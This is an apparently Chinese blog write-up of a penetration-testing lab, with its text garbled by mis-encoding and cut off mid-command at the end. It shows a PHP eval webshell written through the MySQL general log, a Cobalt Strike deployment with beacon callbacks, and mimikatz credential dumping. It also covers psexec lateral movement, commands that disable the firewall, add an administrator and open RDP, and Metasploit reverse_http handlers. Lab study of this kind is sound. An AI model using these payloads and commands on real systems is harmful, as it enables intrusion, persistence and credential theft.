DCOMæœåŠ¡æ¼æ´</p><p>å››ã€æ¨ªå‘ç§»åŠ¨<br>13.å†…ç½‘å…¶å®ƒä¸»æœºç«¯å£-æ–‡ä»¶è¯»å–<br>14.å†…ç½‘å…¶å®ƒä¸»æœºç«¯å£-redis<br>15.å†…ç½‘å…¶å®ƒä¸»æœºç«¯å£-redis Getshell<br>16.å†…ç½‘å…¶å®ƒä¸»æœºç«¯å£-MySQLæ•°æ®åº“<br>17.å†…ç½‘å…¶å®ƒä¸»æœºç«¯å£-MySQLææƒ</p><p>äº”ã€æ„å»ºé€šé“<br>18.å†…ç½‘å…¶å®ƒä¸»æœºç«¯å£-ä»£ç†è½¬å‘</p><p>å…­ã€æŒä¹…æ§åˆ¶<br>19.åŸŸæ¸—é€-åŸŸæˆå‘˜ä¿¡æ¯æ”¶é›†<br>20.åŸŸæ¸—é€-åŸºç¡€æœåŠ¡å¼±å£ä»¤æ¢æµ‹åŠæ·±åº¦åˆ©ç”¨ä¹‹powershell<br>21.åŸŸæ¸—é€-æ¨ªå‘ç§»åŠ¨[wmiåˆ©ç”¨]<br>22.åŸŸæ¸—é€-C2å‘½ä»¤æ‰§è¡Œ<br>23.åŸŸæ¸—é€-åˆ©ç”¨DomainFrontingå®ç°å¯¹beaconçš„æ·±åº¦éšè—<br>24.åŸŸæ¸—é€-åŸŸæ§å®ç°ä¸åˆ©ç”¨</p><p>ä¸ƒã€ç—•è¿¹æ¸…ç†<br>25ã€æ—¥å¿—æ¸…ç†</p><p><strong>é¶åœºæ‹“æ‰‘ç»“æ„</strong></p><p><img src="http://cdn.clown2024.cn/202407151737522.png" alt="image-20240502190140254"></p><p><img src="http://cdn.clown2024.cn/202407151737523.png" alt="image-20240502222209415"></p><blockquote><p>win7ä¸ºç½‘ç«™æœåŠ¡å™¨ï¼ŒwinServerä¸ºåŸŸæˆå‘˜ï¼Œwin2k3ä¸ºåŸŸæ§</p></blockquote><h2 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h2><p>è¿™é‡Œwin7ç›¸å½“äºç½‘ç«™æœåŠ¡å™¨ï¼Œéœ€è¦ä¸¤ä¸ªç½‘å¡ï¼Œæˆ‘è¿™é‡Œè®¾ç½®ä¸ºVMnet2(ä»…ä¸»æœºæ¨¡å¼)å’ŒVMnet8(NATæ¨¡å¼ï¼Œå’Œå¤–ç•Œè¿é€š)</p><p><img src="http://cdn.clown2024.cn/202407151737525.png" alt="image-20240502223937110"></p><p><strong>win7</strong></p><p><img src="http://cdn.clown2024.cn/202407151737526.png" alt="image-20240502224014134"></p><p><strong>win_server</strong></p><p><img src="http://cdn.clown2024.cn/202407151737527.png" alt="image-20240502224057123"></p><p><strong>win2k3</strong></p><p><img src="http://cdn.clown2024.cn/202407151737528.png" alt="image-20240502224144546"></p><p>è®¾ç½®å®Œä¹‹åéœ€è¦å»ç½‘ç»œå…±äº«å°†ipv4æ”¹æˆè‡ªåŠ¨è·å–åœ°å€ï¼Œç„¶åWindows7é˜²ç«å¢™è¦å…³é—­ä¸ç„¶å¤–ç•Œpingä¸é€šï¼›</p><p>æœ€åå»ç›¸äº’pingä¸€ä¸‹çœ‹èƒ½å¦è¿é€šå³å¯</p><p>æœ€åå¯åŠ¨win7ä¸Šçš„webæœåŠ¡å³å¯</p><p><img src="http://cdn.clown2024.cn/202407151737529.png" alt="image-20240502234452111"></p><p>ç„¶åå»è®¿é—®ä¸€ä¸‹æ˜¯èƒ½çœ‹åˆ°phpæ¢é’ˆçš„</p><p><img src="http://cdn.clown2024.cn/202407151737530.png" alt="image-20240502234617353"></p><blockquote><p>éš¾ç»·åé¢å‘ç°win7ä½¿ç”¨<strong>net user &#x2F;domain</strong>è¿ä¸ä¸ŠåŸŸç½‘ç»œï¼Œé…äº†å¥½ä¹…æ‰å¥½ä½†ä¹Ÿä¸æ¸…æ¥šå…·ä½“ä»€ä¹ˆåŸå› ï¼›é…ç½®çš„æ—¶å€™å°±ä¸¥æ ¼æŒ‰ç…§å®˜æ–¹çš„ç½‘æ®µæ¥é…ç½®é‡æ–°é…äº†ä¸€éï¼Œå°†VMnet2ç½‘å¡é…ç½®æˆ192.168.52.xxç½‘æ®µï¼Œå› ä¸ºè™šæ‹Ÿæœºä¸€å¼€å§‹å°±å·²ç»é…ç½®äº†å›ºå®šçš„ipã€‚</p></blockquote><h1 id="webé¡µé¢æ¸—é€"><a href="#Webé¡µé¢æ¸—é€" class="headerlink" title="Webé¡µé¢æ¸—é€"></a>Webé¡µé¢æ¸—é€</h1><h2 id="phpæ¢é’ˆ"><a href="#phpæ¢é’ˆ" class="headerlink" title="phpæ¢é’ˆ"></a>phpæ¢é’ˆ</h2><p>å°±ç›´æ¥å…ˆä»phpçš„æ¢é’ˆé¦–é¡µå¼€å§‹å…¥æ‰‹ï¼Œä»è¿™é‡Œå¼€å§‹æ¸—é€è¿™ä¸ªWebç½‘ç«™</p><p><img src="http://cdn.clown2024.cn/202407151737531.png" alt="image-20240502235433732"></p><p>çœ‹åˆ°æœ‰ä¸ªmysqlè¿æ¥å…ˆæ£€æµ‹ä¸€ä¸‹çœ‹çœ‹ï¼Œç›´æ¥rootã€rootå°è¯•ä¸€ä¸‹</p><p><img src="http://cdn.clown2024.cn/202407151737532.png" alt="image-20240502235519904"></p><p>è¿æ°”å¾ˆå¥½ç›´æ¥æˆåŠŸäº†ï¼Œä½†æ˜¯ç°åœ¨æš‚æ—¶æ²¡ä»€ä¹ˆç”¨</p><h2 id="å…¶ä»–é¡µé¢"><a href="#å…¶ä»–é¡µé¢" class="headerlink" title="å…¶ä»–é¡µé¢"></a>å…¶ä»–é¡µé¢</h2><p>é‚£å°±æƒ¯ä¾‹æ¥ç›®å½•æ‰«æçœ‹ä¸€çœ‹ï¼Œè¿™é‡Œç”¨gobuster</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell">gobuster dir -u &quot;http://192.168.20.134/&quot; --wordlist=/usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737533.png" alt="image-20240502235937240"></p><p>ä½†æ˜¯åŸºæœ¬éƒ½æ˜¯403ï¼Œä½†æ˜¯æœ‰ä¸€ä¸ªphpmyadminåå°é¡µé¢å¼€ç€</p><p>ç„¶åç”¨æˆ‘ä»¬åˆšåˆšæµ‹è¯•å‡ºæ¥çš„æ•°æ®åº“ç”¨æˆ·åå’Œå¯†ç ç›´æ¥å°±å¯ä»¥ç™»è¿›å»äº†(root:root)</p><p><img src="http://cdn.clown2024.cn/202407151737534.png" alt="image-20240503000212471"></p><h2 id="phpmyadminåå°getshell"><a href="#phpmyadminåå°getshell" class="headerlink" title="phpmyadminåå°getshell"></a>phpmyadminåå°getshell</h2><p>å‚è€ƒæ–‡ç« ï¼š<a href="https://www.cnblogs.com/0nc3/p/12071314.html">https://www.cnblogs.com/0nc3/p/12071314.html</a></p><p>æ€»ç»“ä¸€ä¸‹å¤§è‡´æœ‰è¿™å‡ ç§getshellæ–¹å¼ï¼š</p><ol><li><p>select into outfileç›´æ¥å†™å…¥shell</p><p>æ¡ä»¶ï¼š</p><ul><li>å¯¹webç›®å½•éœ€è¦æœ‰å†™æƒé™èƒ½å¤Ÿä½¿ç”¨å•å¼•å·</li><li>çŸ¥é“ç»å¯¹è·¯å¾„</li><li>secure_file_privæ²¡æœ‰å…·ä½“å€¼</li></ul></li><li><p>å…¨å±€æ—¥å¿—getshell</p><p>æ¡ä»¶ï¼šrootæƒé™</p></li><li><p>æ…¢æŸ¥è¯¢æ—¥å¿—getshell</p></li></ol><p>ä¸€å¼€å§‹å°è¯•ç›´æ¥into outfileå†™å…¥æœ¨é©¬å¤±è´¥ï¼Œç»å¯¹è·¯å¾„å¯ä»¥ä»ä¸Šé¢çš„phpæ¢é’ˆé¡µé¢çŸ¥é“ç½‘ç«™çš„ç»å¯¹è·¯å¾„ä¸ºï¼š<code> C:/phpStudy/WWW</code>ï¼Œä¹Ÿå¯ä»¥é€šè¿‡@@basediræ¥æŸ¥è¯¢ï¼Œåªä¸è¿‡æŸ¥åˆ°çš„æ˜¯mysqlçš„æ ¹ç›®å½•ï¼Œä½†æ˜¯å¯ä»¥åæ¨ä¸€ä¸‹</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> &quot;&lt;?php eval($_POST[1]);?&gt;&quot; <span class="hljs-keyword">into</span> outfile <span class="hljs-string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737535.png" alt="image-20240503002537962"></p><p>å»çœ‹ä¸€ä¸‹å‚æ•°</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> <span class="hljs-keyword">global</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%secure%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737536.png" alt="image-20240503002657736"></p><p>è¿™é‡Œä¸ºNULLä»£è¡¨é™åˆ¶mysqlä¸å…è®¸å¯¼å…¥å¯¼å‡ºï¼Œé‚£å°±åªèƒ½çœ‹ä¸€ä¸‹å…¶ä»–æ–¹æ³•äº†</p><p><strong>å…¨å±€æ—¥å¿—å†™shell</strong></p><p>è¿™é‡Œçœ‹çœ‹å…¨å±€æ—¥å¿—çš„é…ç½®æƒ…å†µ</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">show</span> variables <span class="hljs-keyword">like</span> <span class="hljs-string">&#x27;%general%&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737537.png" alt="image-20240503002947148"></p><p>ç„¶åæˆ‘ä»¬å¯ä»¥å¼€å¯general_logï¼Œå¹¶ä¿®æ”¹æ–‡ä»¶ä½ç½®ä¸ºæˆ‘ä»¬çš„ç½‘ç«™çš„shell.php</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log <span class="hljs-operator">=</span> <span class="hljs-keyword">on</span>;<br><span class="hljs-keyword">set</span> <span class="hljs-keyword">global</span> general_log_file <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;C:/phpStudy/WWW/shell.php&#x27;</span>;<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737538.png" alt="image-20240503003300408"></p><p>æ¥ä¸‹æ¥æˆ‘ä»¬ç›´æ¥æŸ¥è¯¢ä¸€ä¸‹æœ¨é©¬å°±ä¼šå†™å…¥æ—¥å¿—äº†</p><figure class="highlight sql"><table><tr><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> &quot;&lt;?php eval($_POST[1]);?&gt;&quot;<br></code></pre></td></tr></table></figure><p>æœ€åèšå‰‘è¿æ¥æˆåŠŸgetshell</p><p><img src="http://cdn.clown2024.cn/202407151737539.png" alt="image-20240503003518399"></p><h2 id="yxcms"><a href="#yxcms" class="headerlink" title="yxcms"></a>yxcms</h2><p>æˆ‘ä»¬getshellä¹‹åå¯ä»¥çœ‹åˆ°è¿˜æœ‰ä¸€ä¸ªyxcmsï¼Œè¿™æ˜¯å½“æ—¶æ²¡æ‰«å‡ºæ¥çš„</p><p><img src="http://cdn.clown2024.cn/202407151737540.png" alt="image-20240503003928666"></p><p>è¿™ä¸ªåœ°æ–¹çœ‹ç½‘ä¸Šä¹Ÿæ˜¯ä¸€ä¸ªåå°ï¼Œåœ¨é¦–é¡µçš„å…¬å‘Šæ å¤„å°±ä¼šæœ‰è´¦å·å¯†ç ï¼Œç™»é™†ä¹‹åå°±å¯ä»¥ç›´æ¥æ·»åŠ ä¸€ä¸ªshell.phpçš„æ–‡ä»¶äº†ï¼Œè¿™é‡Œå°±ä¸æµ‹äº†ã€‚</p><h1 id="csæ‰“æ³•"><a href="#CSæ‰“æ³•" class="headerlink" title="CSæ‰“æ³•"></a>CSæ‰“æ³•</h1><p>è¿™é‡Œåˆšå¥½ç†Ÿæ‚‰ä¸€ä¸‹csçš„ä½¿ç”¨ï¼Œç”¨csæ¥ä¸Šçº¿é¶æœºï¼Œcsçš„ç®€å•éƒ¨ç½²ä¹Ÿç›´æ¥è®°å½•åœ¨è¿™é‡Œå¥½äº†</p><h2 id="cséƒ¨ç½²"><a href="#cséƒ¨ç½²" class="headerlink" title="cséƒ¨ç½²"></a>cséƒ¨ç½²</h2><p>å…ˆå®‰è£…javaç¯å¢ƒï¼Œç½‘ä¸Šéšä¾¿æ‰¾ä¸ªæ•™ç¨‹å³å¯ï¼Œè¿™é‡Œå®‰è£…java8å‚è€ƒï¼š<a href="https://cloud.tencent.com/developer/article/2105638">https://cloud.tencent.com/developer/article/2105638</a></p><p>è¿™é‡Œè®°å½•ä¸€ä¸‹å®‰è£…å‘½ä»¤ï¼š</p><figure class="highlight shell"><table><tr><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">#</span><span class="language-bash">å…ˆå®˜ç½‘ä¸‹è½½ä¸€ä¸ªjdkåŒ…ï¼Œåˆ›å»ºä¸€ä¸ªç›®å½•å­˜æ”¾è§£å‹åæ–‡ä»¶ï¼Œæˆ‘è¿™é‡Œçš„jdkæ˜¯<span class="hljs-string">&quot;jdk-8u401-linux-x64.tar.gz&quot;</span></span><br>sudo mkdir /usr/lib/jvm<br>sudo tar -zxvf jdk-8u401-linux-x64.tar.gz -C /usr/lib/jvm<br><span class="hljs-meta prompt_">#</span><span class="language-bash">ä¿®æ”¹ç¯å¢ƒå˜é‡</span><br>sudo vim ~/.bashrc<br><span class="hljs-meta prompt_">#</span><span class="language-bash">æ–‡ä»¶æœ«å°¾æ·»åŠ </span><br><span class="hljs-meta prompt_">#</span><span class="language-bash"><span class="hljs-built_in">set</span> oracle jdk environment</span><br>export JAVA_HOME=/usr/lib/jvm/jdk1.8.0_401  ## è¿™é‡Œè¦æ³¨æ„ç›®å½•è¦æ¢æˆè‡ªå·±è§£å‹çš„jdk ç›®å½•<br>export JRE_HOME=$&#123;JAVA_HOME&#125;/jre  <br>export CLASSPATH=.:$&#123;JAVA_HOME&#125;/lib:$&#123;JRE_HOME&#125;/lib  <br>export PATH=$&#123;JAVA_HOME&#125;/bin:$PATH <br><span class="hljs-meta prompt_">#</span><span class="language-bash">ä½¿ç¯å¢ƒå˜é‡ç”Ÿæ•ˆ</span><br>source ~/.bashrc<br><span class="hljs-meta prompt_">#</span><span class="language-bash">è®¾ç½®é»˜è®¤jdk</span><br>sudo update-alternatives --install /usr/bin/java java /usr/lib/jvm/jdk1.8.0_401/bin/java 300  <br>sudo update-alternatives --install /usr/bin/javac javac /usr/lib/jvm/jdk1.8.0_401/bin/javac 300  <br>sudo update-alternatives --install /usr/bin/jar jar /usr/lib/jvm/jdk1.8.0_401/bin/jar 300   <br>sudo update-alternatives --install /usr/bin/javah javah /usr/lib/jvm/jdk1.8.0_401/bin/javah 300   <br>sudo update-alternatives --install /usr/bin/javap javap /usr/lib/jvm/jdk1.8.0_401/bin/javap 300 <br><span class="hljs-meta prompt_">#</span><span class="language-bash">æ‰§è¡Œ</span><br>sudo update-alternatives --config java<br><span class="hljs-meta prompt_">#</span><span class="language-bash">æµ‹è¯•å®‰è£…æˆåŠŸ</span><br>java -version<br>javac -version<br></code></pre></td></tr></table></figure><p>ç”¨ä¸€å°å¤–ç½‘ä¸»æœºæ¥éƒ¨ç½²csæœåŠ¡å™¨ï¼Œè¦ç»™serverç›®å½•ä¸‹çš„teamserveræ–‡ä»¶å¯æ‰§è¡Œæƒé™</p><p><img src="http://cdn.clown2024.cn/202407151737541.png" alt="image-20240503112207679"></p><p>ç„¶åå¯åŠ¨å›¢é˜ŸæœåŠ¡å™¨ï¼Œè®¾ç½®å½“å‰æœåŠ¡å™¨çš„ipåœ°å€å’Œå¯†ç </p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">./teamserver &lt;vpsåœ°å€&gt; &lt;å¯†ç &gt;<br></code></pre></td></tr></table></figure><p>ç„¶ååˆ©ç”¨å¯åŠ¨è„šæœ¬å¯åŠ¨ï¼Œæˆ‘ç”¨çš„4.8ç‰ˆæœ¬åªæœ‰ä¸€ä¸ªå¯åŠ¨è„šæœ¬ï¼Œå…¶ä»–ç‰ˆæœ¬æ˜¯åˆ†ä¸åŒç³»ç»Ÿä¸åŒçš„å¯åŠ¨è„šæœ¬ï¼Œæˆ‘è¿™é‡Œå¯åŠ¨è„šæœ¬åœ¨Windowså¯åŠ¨ä¸äº†ï¼Œç¯å¢ƒæ²¡æå®šï¼Œæ‰€ä»¥æˆ‘å°±ç”¨kaliäº†</p><p><img src="http://cdn.clown2024.cn/202407151737542.png" alt="image-20240503162849976"></p><p>ç„¶åè¾“å…¥ä¸»æœºå’Œå¯†ç ç™»é™†å³å¯ï¼Œç”¨æˆ·åéšä¾¿å®š</p><p><img src="http://cdn.clown2024.cn/202407151737543.png" alt="image-20240503163035180"></p><blockquote><p>æˆ‘è¿™é‡ŒæœåŠ¡å™¨æ­åœ¨äº†è…¾è®¯äº‘ä¸Šé¢ï¼Œè®°å¾—è¦å¼€æ”¾50050çš„é˜²ç«å¢™ç«¯å£æ‰èƒ½è¿ä¸Š</p><p>å…·ä½“åŠŸèƒ½ä½¿ç”¨å¯ä»¥çœ‹è¿™ç¯‡æ–‡ç« ï¼š<a href="https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html">https://wiki.wgpsec.org/knowledge/intranet/Cobalt-Strike.html</a></p><p>äº‘æœåŠ¡å™¨æ­å»ºå¯èƒ½å‡ºç°çš„é—®é¢˜å‚è€ƒè¿™ç¯‡æ–‡ç« ï¼š<a href="https://www.cnblogs.com/henry666/p/14027939.html">äº‘æœåŠ¡å™¨ä¸Šæ­å»ºcobalt strikeé‡åˆ°çš„ä¸€äº›å°é—®é¢˜ - äº¨åˆ©å…¶å®å¾ˆå - åšå®¢å›­ (cnblogs.com)</a></p></blockquote><h2 id="csä¸Šçº¿é¶æœº"><a href="#csä¸Šçº¿é¶æœº" class="headerlink" title="csä¸Šçº¿é¶æœº"></a>csä¸Šçº¿é¶æœº</h2><p>ç”Ÿæˆä¸€ä¸ªWindowsåé—¨é€šè¿‡èšå‰‘ä¸Šä¼ åˆ°é¶æœº</p><p><img src="http://cdn.clown2024.cn/202407151737544.png" alt="image-20240503164400241"></p><p>åœ¨è¿™ä¹‹å‰è¦å…ˆé…ç½®ä¸€ä¸ªç›‘å¬å™¨</p><p><img src="http://cdn.clown2024.cn/202407151737545.png" alt="image-20240503165738645"></p><p>åˆ©ç”¨èšå‰‘ä¸Šä¼ åˆ°ç½‘ç«™åï¼Œè¿è¡Œè¯¥ç¨‹åºå³å¯çœ‹åˆ°é¶æœºä¸Šçº¿</p><p><img src="http://cdn.clown2024.cn/202407151737546.png" alt="image-20240503165821623"></p><p>å¯ä»¥ç›´æ¥å³å‡»é¶æœºåˆ©ç”¨mimikatzæŠ“å–æœ¬åœ°å¯†ç ï¼Œæˆ–è€…ç›´æ¥è¾“å…¥hashdumpåˆ—å‡ºç”¨æˆ·å“ˆå¸Œ</p><p><img src="http://cdn.clown2024.cn/202407151737547.png" alt="image-20240503170150900"></p><p>ç„¶ååˆ©ç”¨Explore&#x3D;ã€‹new viewæ¢æµ‹ä¸€ä¸‹å…¶ä»–ä¸»æœº</p><p><img src="http://cdn.clown2024.cn/202407151737548.png" alt="image-20240503170603756"></p><p><img src="http://cdn.clown2024.cn/202407151737549.png" alt="image-20240503170916667"></p><p>æ‰«å‡ºäº†æˆ‘ä»¬å†…ç½‘çš„å¦å¤–ä¸¤å°é¶æœº</p><p><strong>åŸŸå†…ä¿¡æ¯æœé›†</strong></p><p>éº»äº†ï¼Œè¿™é‡Œwin7è¿ä¸ä¸ŠåŸŸæ§æ˜¯çœŸçš„æ— è¯­ï¼Œä¹Ÿä¸çŸ¥é“ç½‘å¡å‡ºäº†ä»€ä¹ˆé—®é¢˜æäº†åŠå¤©ã€‚</p><blockquote><p>åæ¥ä¸¥æ ¼æŒ‰ç…§å®˜ç½‘é‡æ–°é…äº†ä¸€éæ‰å¥½ï¼Œä¸Šé¢ä¹Ÿæœ‰è¯´æ˜ï¼›</p></blockquote><p>å¯ä»¥ä½¿ç”¨sleep 0åŠ å¿«ä¸€ä¸‹äº¤äº’ï¼Œä¸è¿‡å®æˆ˜å¯èƒ½æœ€å¥½ä¸è¦ï¼Œå› ä¸ºå®¹æ˜“è¢«å‘ç°</p><p><img src="http://cdn.clown2024.cn/202407151737550.png" alt="image-20240508231828984"></p><p>æˆ‘ä»¬å¯ä»¥å…ˆç¡®å®šä¸€ä¸‹åŸŸæ§å’Œå…¶ä»–åŸŸç”¨æˆ·</p><p><strong>åˆ¤æ–­åŸŸç¯å¢ƒ</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">shell net config workstation<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737551.png" alt="image-20240508232032749"></p><p><strong>åˆ¤æ–­åŸŸç”¨æˆ·</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">shell net user /domain<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737552.png" alt="image-20240508232158760"></p><p><strong>åˆ¤æ–­åŸŸæ§</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">shell net group &quot;Domain Controllers&quot; /domain<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737553.png" alt="image-20240508232406793"></p><p>ç¡®å®šäº†åŸŸæ§çš„ä¸»æœºä¸º<code>OWA$</code>ï¼Œå¯ä»¥pingä¸€ä¸‹çœ‹èƒ½ä¸èƒ½é€š</p><p><img src="http://cdn.clown2024.cn/202407151737554.png" alt="image-20240508232935606"></p><p>åˆ©ç”¨<code>net time</code>ä¹Ÿå¯ä»¥å®šä½åŸŸæ§ï¼Œè¿™é‡Œå°±ä¸æ¼”ç¤ºäº†</p><p><strong>çœ‹ä¸€ä¸‹åŸŸç®¡ç†å‘˜</strong></p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">shell net group &quot;Domain Admins&quot; /domain<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737555.png" alt="image-20240508233119937"></p><p><strong>æ¨ªå‘ç§»åŠ¨</strong></p><p>ç›´æ¥è¾“å…¥<code>net view</code>å‘½ä»¤å¯ä»¥æ¢æµ‹åˆ°å…¶ä»–çš„åŸŸä¸»æœº</p><p><img src="http://cdn.clown2024.cn/202407151737556.png" alt="image-20240508233307337"></p><p><img src="http://cdn.clown2024.cn/202407151737557.png" alt="image-20240508233320930"></p><p>ç‚¹å‡»ä¸Šå›¾çš„åœ°æ–¹åˆ—å‡ºæˆ‘ä»¬åˆšåˆšæ‰«æå‡ºæ¥çš„å†…ç½‘ä¸»æœºï¼Œå³å‡»é€‰æ‹©jump&#x3D;ã€‹psexecå»ç™»é™†ä¸€ä¸‹å°è¯•ï¼Œå¯†ç å°±æ˜¯æˆ‘ä»¬æ”¹è¿‡çš„è¿™ä¸ª<code>Hongrisec@2019</code>ï¼Œå› ä¸ºå¯†ç ä¸€èˆ¬éƒ½æ˜¯ç”±åŸŸæ§ç®¡ç†çš„ï¼Œæ‰€ä»¥ä¸€èˆ¬éƒ½æ˜¯ä¸€æ ·çš„ï¼Œæ‰€ä»¥win7è¿™å°é¶æœºå…¶å®ä¹Ÿåº”è¯¥æ”¹æˆè¿™ä¸ªå¯†ç æ‰å¯¹ã€‚</p><p>ç„¶åè¿™é‡Œå°±å¯ä»¥ç›´æ¥ä¸€æŠŠæ¢­äº†å…¶å®ï¼Œç›´æ¥ç”¨å½“å‰ä¸»æœºçš„å‡­æ®å»ç”¨psexecæ¨ªå‘ç§»åŠ¨å³å¯ï¼Œå› ä¸ºå‡­æ®éƒ½æ˜¯ä¸€æ ·çš„ï¼Œç„¶åç›‘å¬å™¨ä¹Ÿé€‰æ‹©é‚£ä¸ªåå‘shellçš„httpç›‘å¬å™¨</p><p><img src="http://cdn.clown2024.cn/202407151737558.png" alt="image-20240508234256791"></p><p>ä¸¤å°ä¸»æœºéƒ½è¿™æ ·é€‰æ‹©ï¼Œç„¶åç­‰å¾…å›è¿å³å¯</p><p>emmmå¾ˆå°´å°¬åªä¸Šçº¿äº†ä¸€å°åŸŸæ§ï¼Œå¦ä¸€å°åŸŸæˆå‘˜åè€Œæ²¡ä¸Šçº¿å¾ˆå¥‡æ€ª</p><p><img src="http://cdn.clown2024.cn/202407151737559.png" alt="image-20240508235438343"></p><p>åæ¥å…ˆå»ºç«‹äº†smbç›‘å¬å°±å¯ä»¥è¿›è¡Œpsexecæ¨ªå‘ç§»åŠ¨äº†ï¼Œå¢åŠ ä¸€ä¸ªsmbç›‘å¬å™¨å³å¯</p><p><img src="http://cdn.clown2024.cn/202407151737560.png" alt="image-20240517224609304"></p><p><img src="http://cdn.clown2024.cn/202407151737561.png" alt="image-20240517224625150"></p><p>æ¥ä¸‹æ¥ç”¨MSFçš„æ‰“æ³•ï¼Œå­¦å­¦å…¶ä»–ä¸œè¥¿</p><p><strong>å…³é—­é˜²ç«å¢™ã€æ·»åŠ ç®¡ç†å‘˜è´¦æˆ·</strong></p><p>è¿™é‡Œä¸€å¼€å§‹ä¸Šçº¿åº”è¯¥é¡ºæ‰‹åˆ›ç«‹ç®¡ç†å‘˜ç”¨æˆ·ç„¶åå…³é—­é˜²ç«å¢™çš„ï¼Œè¡¥ä¸€ä¸‹:</p><p>è¿˜è¦å¼€3389ç”¨äºè¿œç¨‹è¿æ¥</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off <span class="hljs-comment">#winå…³é—­é˜²ç«å¢™</span><br>net user clown 123qwe@2024 /add   <span class="hljs-comment">#æ·»åŠ è´¦æˆ·å¯†ç </span><br>net localgroup administrators clown <span class="hljs-comment">#æ·»åŠ ä¸ºç®¡ç†å‘˜æƒé™</span><br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f <span class="hljs-comment">#å¼€å¯3389ç«¯å£</span><br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f <span class="hljs-comment">#å…³é—­3389</span><br></code></pre></td></tr></table></figure><h1 id="msfæ¸—é€æ‰“æ³•"><a href="#MSFæ¸—é€æ‰“æ³•" class="headerlink" title="MSFæ¸—é€æ‰“æ³•"></a>MSFæ¸—é€æ‰“æ³•</h1><h2 id="csè”åŠ¨msf"><a href="#CSè”åŠ¨MSF" class="headerlink" title="CSè”åŠ¨MSF"></a>CSè”åŠ¨MSF</h2><p>è¿™é‡Œå°±ä¸é‡æ–°ç”¨MSFæ¥æ‹¿shelläº†</p><p>æˆ‘ä»¬å¯ä»¥CSå¼€å¯ä¸€ä¸ªæ–°ç›‘å¬ï¼Œç„¶åmsfå¼€å¯ç›‘å¬ï¼Œå°†sessionè½¬ç§»åˆ°msfä¸Šé¢</p><p><img src="http://cdn.clown2024.cn/202407151737562.png" alt="image-20240517232416545"></p><p><img src="http://cdn.clown2024.cn/202407151737563.png" alt="image-20240517232757549"></p><p>MSF:</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_http <span class="hljs-comment">#ä¸€å®šè¦æ³¨æ„payloadæ˜¯httpä¸æ˜¯tcpï¼Œä¸€å¼€å§‹ç”¨äº†tcpä¸€ç›´è¿ä¸ä¸Š</span><br><span class="hljs-built_in">set</span> lhost 192.168.20.128<br><span class="hljs-built_in">set</span> lport 6666<br>exploit<br></code></pre></td></tr></table></figure><p><img src="http://cdn.clown2024.cn/202407151737564.png" alt="image-20240518001337395"></p><p><strong>ä¹Ÿå¯ä»¥MSFæ´¾ç”Ÿä¼šè¯ç»™cs</strong></p><p>è¿™é‡Œè®°å½•æµç¨‹å°±ä¸è¯•äº†</p><p>é¦–å…ˆmsfä¸­å·²æœ‰ä¼šè¯session1</p><figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use exploit/windows/local/payload_inject<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_http  <span class="hljs-comment">#ä¸¤è¾¹çš„payloadåè®®ä¸€å®šè¦å¯¹åº”çš„</span><br><span class="hljs-built_in">set</span> DisablePayloadHandler <span class="hljs-literal">true</span>   <span class="hljs-comment">#é»˜è®¤æƒ…å†µä¸‹ï¼Œpayload_injectæ‰§è¡Œä¹‹åä¼šåœ¨æœ¬åœ°äº§ç”Ÿä¸€ä¸ªæ–°çš„handlerï¼Œç”±äºå·²ç»æœ‰äº†ä¸€ä¸ªä¸éœ€è¦å†äº§ç”Ÿä¸€ä¸ªï¼Œæ‰€ä»¥è¿™é‡Œè®¾ç½®ä¸ºtrue</span><br><span class="hljs-built_in">set</span> lhost xxxx <span class="hljs-comment">#cobaltstrikeæœåŠ¡ç«¯ip</span><br><span class="hljs-built_in">set</span> lport xxxx <span class="hljs-comment">#cobaltstrikeæœåŠ¡ç«¯ç›‘å¬çš„ç«¯å£ </span><br><span class="hljs-built_in">set</span> session 1  <span 